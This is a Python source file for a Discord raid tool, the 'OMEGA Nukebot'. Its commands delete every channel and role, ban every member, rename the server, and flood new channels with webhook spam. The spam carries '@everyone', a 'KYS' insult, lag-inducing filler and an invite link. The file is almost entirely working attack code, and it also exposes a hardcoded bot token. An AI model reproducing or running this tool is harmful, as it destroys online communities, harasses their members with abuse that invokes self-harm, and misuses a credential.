import asyncio
import random
import aioconsole
import aiohttp
import discord
import ujson
import uvloop
from discord import AsyncWebhookAdapter, Webhook
from discord.ext import commands

# Delete this line if you are getting uvloop errors
uvloop.install()


# Set up
PREFIX = "o!"
TOKEN = "MTAyMjMwODU0MjMwNjMyNDYxMQ.GDcXaa.qSNQ4P76L5uMtiJWvN3RinV5DvzJUj7M8bvLuo"
CHANNEL_NAME = ["this server sucks"]
ROLE_NAME = ["L"]
SPAM_MSG = ["KYS THIS SERVER SUCKS @everyone"]
WEBHOOK_NAME = ["server sucks"]
with open('./omega.gif', 'rb') as f:
	IMAGE = f.read()



# CONSTANTS
BASE_URL = "https://discord.com/api/oauth2"
HEADER = {"authorization": f"Bot {TOKEN}"}


OMEGA = commands.Bot(command_prefix = commands.when_mentioned_or(PREFIX), case_insensitive=True, intents=discord.Intents.default(), help_command=None)


@OMEGA.event
async def on_ready():
	await aioconsole.aprint(f"OMEGA Bot is connected!\nLogged in as: {OMEGA.user.name}#{OMEGA.user.discriminator}\nPREFIX: {PREFIX}")
	await aioconsole.aprint(f"Guilds: {len(OMEGA.guilds)}")



@OMEGA.command(name="Help", description="The help command")
async def help(ctx):
	await ctx.message.delete()
	em = discord.Embed(title="OMEGA Nukebot", description="Commands are listed below. All commands are case insensitive")
	for command in OMEGA.walk_commands():
		if len(command.aliases) < 1:
			em.add_field(name=f"`{PREFIX}{command.name}`", value=f"{command.description}", inline=False)
		else:
			for i in range(len(command.aliases)):
				command.aliases[i] = f"{PREFIX}{command.aliases[i]}"
			aliases = ", ".join(command.aliases)
			em.add_field(name=f"`{PREFIX}{command.name}, {aliases}`", value=f"{command.description}", inline=False)
	em.set_thumbnail(url="https://cdn.discordapp.com/attachments/963075510487900250/996759271532417086/omega.gif")
	em.set_image(url="https://cdn.discordapp.com/attachments/963075510487900250/996759271532417086/omega.gif")
	em.set_footer(text="OMEGA Nukebot")
	em.set_author(name="OMEGA", icon_url="https://cdn.discordapp.com/attachments/963075510487900250/996759271532417086/omega.gif")
	await ctx.send(embed=em)





async def delchan(session: aiohttp.ClientSession, id):
	while True:
		async with session.delete(f"{BASE_URL}/channels/{id}", headers=HEADER) as resp:
			if resp.status == 200:

				break
			elif resp.status == 429:
				j = await resp.json()
				await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				await aioconsole.aprint(f"Error: {resp.status} -- {j}")
				break


async def channel_deleter(ctx):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		await asyncio.gather(*(asyncio.create_task(delchan(session, channel.id)) for channel in ctx.guild.channels))


@OMEGA.command(name="ChanDel", description="Deletes all channels in guild", aliases=["ChannelDelete", "ChannDel", "CD"])
async def _cd(ctx):
	await ctx.message.delete()
	await channel_deleter(ctx)



async def chancreate(session, id):
	while True:
		async with session.post(f"{BASE_URL}/guilds/{id}/channels", headers=HEADER, json={"type":0,"name":random.choice(CHANNEL_NAME),"permission_overwrites":[]}) as resp:
			if resp.status == 201:
				break
			elif resp.status == 429:
				j = await resp.json()
				await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				await aioconsole.aprint(f"Error: {resp.status} -- {j}")
				break


async def chancreater(id):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		await asyncio.gather(*(asyncio.create_task(chancreate(session, id)) for i in range(60)))

@OMEGA.command(name="ChanCreate", description="Mass creates channels", aliases=['CC', 'ChannelCreate', 'ChannCreate'])
async def _cc(ctx):
	await ctx.message.delete()
	await chancreater(ctx.guild.id)


# Role Creater command begins here
async def rolecreate(session, id):
	while True:
		async with session.post(f"{BASE_URL}/guilds/{id}/roles", headers=HEADER, json={"name": random.choice(ROLE_NAME)}) as resp:
			if resp.status == 200:
				break
			elif resp.status == 429:
				j = await resp.json()
				await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				await aioconsole.aprint(f"Error: {resp.status} -- {j}")
				break

async def rolecreater(id):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		await asyncio.gather(*(asyncio.create_task(rolecreate(session, id)) for i in range(100)))

@OMEGA.command(name="RoleCreate", description="Mass creates roles", aliases=['RC', 'RoleSpam', 'Rspam'])
async def _rc(ctx):
	await ctx.message.delete()
	await rolecreater(ctx.guild.id)


async def roledel(session, guild_id, role_id):
	while True:
		async with session.delete(f"{BASE_URL}/guilds/{guild_id}/roles/{role_id}", headers=HEADER) as resp:
			if resp.status == 204:
				break
			elif resp.status == 429:
				j = await resp.json()
				await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				await aioconsole.aprint(f"Error: {resp.status} -- {j}")
				break

async def roledeleter(ctx):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		await asyncio.gather(*(asyncio.create_task(roledel(session, ctx.guild.id, role.id)) for role in ctx.guild.roles))




@OMEGA.command(name="RoleDel", description="Deletes all roles in guild", aliases=['RD', 'RoleDelete', 'RoleDeleter'])
async def _rd(ctx):
	await ctx.message.delete()
	await roledeleter(ctx)

async def banall(session, guild_id, user_id):
	while True:
		async with session.put(f"{BASE_URL}/guilds/{guild_id}/bans/{user_id}", headers=HEADER, json={"delete_message_days":"7"}) as resp:
			if resp.status == 204:
				break
			elif resp.status == 429:
				j = await resp.json()
				await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				await aioconsole.aprint(f"Error: {resp.status} -- {j}")
				break

async def banner(ctx):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		for i in range(0, len(ctx.guild.members), 55):
			await asyncio.gather(*(asyncio.create_task(banall(session, ctx.guild.id, user.id)) for user in ctx.guild.members[i:i+55]))




@OMEGA.command(name="BanAll", description="Bans all members in Guild", aliases=["Ban"])
async def _ban(ctx):
	await ctx.message.delete()
	await banner(ctx)

async def unbanall(session, guild_id, user_id):
	while True:
		async with session.delete(f"{BASE_URL}/guilds/{guild_id}/bans/{user_id}", headers=HEADER) as resp:
			if resp.status == 204:
				break
			elif resp.status == 429:
				j = await resp.json()
				await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				await aioconsole.aprint(f"Error: {resp.status} -- {j}")
				break

async def unban(ctx):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		users = await ctx.guild.bans()
		for i in range(0, len(users), 55):
			await asyncio.gather(*(asyncio.create_task(unbanall(session, ctx.guild.id, user.user.id)) for user in users[i:i+55] ))




@OMEGA.command(name="Unban", description="Unbans all banned members in guild", aliases=['Unbanall'])
async def _unban(ctx):
	await ctx.message.delete()
	await unban(ctx)











@OMEGA.command(name="Nuke", description="Does all the above", aliases=['Wizz', 'Kaboom', 'Boom', 'Mushroom'])
async def _nuke(ctx):
	await ctx.message.delete()
	await channel_deleter(ctx)
	await chancreater(ctx.guild.id)
	await banner(ctx)
	await ctx.guild.edit(name="OMEGA", icon=IMAGE)
	await roledeleter(ctx)
	await rolecreater(ctx.guild.id)







async def message_spam(id):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		embed = {"title":"OMEGA Nuke", "description": "Balls :smirk:"}
		while True:
			blanks = "||​||" * 1800
			lag = f"{random.choice(SPAM_MSG)}{blanks}"
			async with session.post(f"{BASE_URL}/channels/{id}/messages", headers=HEADER, json={"content": f"@everyone {lag}https://discord.gg/fuf8t4JWDV", "embeds":[embed]}) as resp:
				if resp.status == 200:
					None
				elif resp.status == 429:
					j = await resp.json()
					await aioconsole.aprint(f"Ratelimited, please wait {j['retry_after']} seconds")
					await asyncio.sleep(j['retry_after'])
				else:
					j = await resp.json()
					await aioconsole.aprint(f"Error: {resp.status} -- {j}")
					break

async def webhook_spam(webhook):
	em = discord.Embed(title="OMEGA Nuke", description="Nuked by OMEGA")
	em.set_image(url="https://cdn.discordapp.com/attachments/963075510487900250/996759271532417086/omega.gif")
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		webhook = Webhook.from_url(webhook.url, adapter=AsyncWebhookAdapter(session))
		while True:
			blanks = "||​||" * 1600
			lag = f"{random.choice(SPAM_MSG)}{blanks[:1800]}"
			await webhook.send(f"@everyone {lag}https://discord.gg/fuf8t4JWDV", embed=em)





# Regular Message Spam event
# @OMEGA.event
# async def on_guild_channel_create(channel):
# 	await asyncio.sleep(1.5)
# 	asyncio.create_task(message_spam(channel.id))

# Discord.py Webhook Message Spam
@OMEGA.event
async def on_guild_channel_create(channel):
	await asyncio.sleep(1.5)
	webhook = await channel.create_webhook(name = f"{random.choice(WEBHOOK_NAME)}")
	asyncio.create_task(webhook_spam(webhook))

OMEGA.run(TOKEN)
